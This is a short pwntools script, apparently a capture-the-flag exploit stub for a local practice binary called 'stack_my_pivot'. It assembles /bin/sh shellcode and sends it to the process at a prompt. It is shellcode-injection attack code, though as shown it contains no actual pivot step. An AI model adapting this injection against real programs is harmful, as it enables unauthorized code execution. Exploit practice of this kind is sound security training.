from pwn import *

elf = context.binary = ELF('./stack_my_pivot')

shellcode = asm(shellcraft.sh())

p = process()

p.sendafter('?', shellcode)


